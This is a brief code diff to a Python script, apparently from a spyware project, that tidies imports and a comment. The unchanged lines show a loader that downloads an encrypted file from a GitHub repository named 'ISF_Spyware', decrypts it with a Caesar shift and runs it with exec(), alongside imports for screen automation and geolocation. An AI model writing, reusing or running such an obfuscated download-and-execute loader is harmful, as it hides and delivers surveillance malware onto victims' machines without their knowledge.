@@ -11,7 +11,6 @@ import requests
 import geocoder
 import glob
 import pyautogui
-import requests
 
 def download_file(url):
     response = requests.get(url)
@@ -32,7 +31,6 @@ def decrypt_text(file_content, shift):
     decrypted_text = decrypt(file_content, shift)
     exec(decrypted_text)
 
-#encrypt_file('test.py', 'config.txt', 3)
 github_url = "https://raw.githubusercontent.com/Basit2121/ISF_Spyware/main/cipher.txt"
 file_content = download_file(github_url)
 decrypt_text(file_content, 3)
